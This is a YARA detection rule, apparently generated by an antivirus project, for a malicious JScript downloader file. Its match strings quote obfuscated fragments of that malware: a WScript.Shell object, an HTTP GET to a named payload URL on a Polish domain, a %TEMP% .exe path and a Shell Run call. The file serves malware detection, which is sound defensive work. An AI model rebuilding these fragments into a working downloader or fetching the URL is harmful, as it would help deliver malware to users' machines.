rule sig_20160401_c0fb4ef82d23bc6593db37466e993b27 {
  meta:
    description = "datamaliciousorder - file 20160401_c0fb4ef82d23bc6593db37466e993b27.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c577a06b6096870b1883cced5509917d699484e19ea2959fbaaa34432360e876"

  strings:
    $s1  = "function ZbnQo(RhjDn, VuaJi){CxwBli = CxwBli * 1; return RhjDn - VuaJi;};" fullword ascii
    $s2  = "var AudGe = function XjsCxz() {return WScript[VkEj](\"WScript\"+\".Shell\");}(), TldOw = 11;" fullword ascii
    $s3  = "NzwOxr[IndMvy](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (NzwOxr[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LiGkx(){return FawGll + \"\";};" fullword ascii
    $s6  = "function CnuIy() {return AudGe[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Y9vwDKG3r.ex\" + \"e\";};" fullword ascii
    $s7  = "function NyHpc() {return ((WsPqv == true) && (WsPqv == AgReo)) ? 1 : CxwBli;};" fullword ascii
    $s8  = "var CoqMb = new this[\"Date\"]();" fullword ascii
    $s9  = "function SbMyn(YyWd){AudGe[\"R\"+\"un\"](YyWd, CxwBli, CxwBli);};" fullword ascii
    $s10 = "return ZbnQo(NkAe, LxQgk);" fullword ascii
    $s11 = "function FzPqa(){return VkEj;};" fullword ascii
    $s12 = "function RbZwu()" fullword ascii
    $s13 = "var AgReo = false;" fullword ascii
    $s14 = "var WsPqv = false;" fullword ascii
    $s15 = "function ZfWb(CdgVg) {var BdjVm = (1, 2, 3, 4, 5, CdgVg); return BdjVm;};" fullword ascii
    $s16 = "function QeHz(){return 23;};" fullword ascii
    $s17 = "}while (MziUqf);" fullword ascii
    $s18 = "AgReo = true; " fullword ascii
    $s19 = "WsPqv = true; " fullword ascii
    $s20 = "var MsrVrw = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}